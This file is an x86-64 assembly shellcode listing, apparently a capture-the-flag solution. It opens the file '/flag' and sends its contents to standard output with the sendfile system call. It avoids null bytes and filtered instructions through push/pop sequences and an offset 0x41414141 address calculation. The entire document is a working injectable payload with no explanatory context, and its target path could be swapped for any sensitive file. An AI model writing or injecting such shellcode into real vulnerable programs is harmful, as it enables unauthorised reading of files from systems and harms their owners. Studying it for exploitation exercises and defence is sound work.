.global _start
_start:
.intel_syntax noprefix
        push 2
        pop rax
        lea rdi, [rip+flag+0x41414141]
        sub rdi, 0x41414141
        xor rsi, rsi
        xor rdx, rdx
        syscall

        push rax
        pop rcx

        push 40
        pop rax
        push 1
        pop rdi
        push rcx
        pop rsi
        xor rdx, rdx
        push 41414141
        pop r10
        syscall

flag:
        .ascii "/flag"
